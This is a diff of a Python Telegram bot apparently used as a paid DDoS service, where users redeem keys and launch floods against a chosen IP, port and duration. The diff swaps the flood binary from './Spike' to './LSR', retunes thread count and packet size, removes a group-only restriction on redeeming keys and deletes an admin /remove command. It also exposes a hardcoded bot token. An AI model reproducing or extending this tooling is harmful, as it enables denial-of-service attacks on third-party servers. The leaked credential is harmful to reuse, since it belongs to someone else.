@@ -29,8 +29,8 @@ ADMIN_IDS = [7163028849]
 # Add this global variable at the top of your script
 ALLOWED_GROUP_ID = -1002450091623  # Replace with your actual group ID
 BOT_TOKEN = "8022705558:AAFAJD_--b6f96kuatpQOqPMefnec7hIQPY"
-thread_count = 900
-packet_size = 8
+thread_count = 500
+packet_size = 12
 ADMIN_FILE = 'admin_data.json'
 last_attack_times = {}
 COOLDOWN_MINUTES = 3
@@ -355,7 +355,7 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
         update_last_attack_time(user_id)
 
         # Construct command for dark binary with thread count and packet size
-        command = f"./Spike {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./LSR {target_ip} {target_port} {duration} {packet_size} {thread_count}"
 
         # Send initial attack message
         bot.send_message(chat_id, 
@@ -757,15 +757,8 @@ def genkey_command(message):
 # Repeat the group check for all other command handlers
 @bot.message_handler(commands=['redeem'])
 def redeem_command(message):
-    chat_id = message.chat.id
-    
-    # Check if the message is from the allowed group
-    if not is_allowed_group(chat_id):
-        bot.send_message(chat_id, "⚠️ This bot can only be used in the specific group. Please use it there.")
-        return
-
-    # Rest of the redeem_command function remains the same
     user_id = message.from_user.id
+    chat_id = message.chat.id
     cmd_parts = message.text.split()
 
     if len(cmd_parts) != 2:
@@ -812,27 +805,6 @@ def redeem_command(message):
             bot.send_message(chat_id, "*This key has already been redeemed!*", parse_mode='Markdown')
         else:
             bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')
-
-@bot.message_handler(commands=['remove'])
-def remove_user_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    if not is_admin(user_id):
-        bot.send_message(chat_id, "*You are not authorized to remove users.\nContact Owner:- ᚛ @TITANOP24 ᚜*", parse_mode='Markdown')
-        return
-
-    cmd_parts = message.text.split()
-    if len(cmd_parts) != 2:
-        bot.send_message(chat_id, "*Usage: /remove <user_id>*", parse_mode='Markdown')
-        return
-
-    target_user_id = int(cmd_parts[1])
-    users = load_users()
-    users = [user for user in users if user['user_id'] != target_user_id]
-    save_users(users)
-
-    bot.send_message(chat_id, f"User {target_user_id} has been removed.")
 
 @bot.message_handler(commands=['users'])
 def list_users_command(message):
